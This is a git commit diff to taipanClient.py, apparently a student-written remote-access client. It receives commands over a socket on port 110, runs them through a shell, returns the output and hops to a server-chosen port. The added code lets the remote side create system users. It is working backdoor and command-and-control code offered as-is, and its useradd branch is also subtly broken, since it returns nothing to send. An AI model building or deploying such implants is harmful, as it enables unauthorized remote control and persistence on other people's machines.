4cfdecd699aaef461d27f55276f3a1740e9bc7df
rdhar <rdh1896@rit.edu>
2020-11-04 17:21:55 -0500

    Created server and client files

--- taipanClient.py
+++ taipanClient.py
@@ -11,6 +11,17 @@ import time
 BUFFER = 1024
 
 
+def directive(command):
+    parts = command.split()
+    if parts[0] == "useradd":
+        process = subprocess.Popen(['useradd', parts[1]],
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+    else:
+        return subprocess.getoutput(command)
+
+
 def main():
     ip = "0.0.0.0"
     port = 110
@@ -21,7 +32,7 @@ def main():
         if command.lower() == "exit":
             break
         print(command)
-        output = subprocess.getoutput(command)
+        output = directive(command)
         s.send(output.encode())
         new_info = s.recv(BUFFER).decode()
         port = int(new_info)
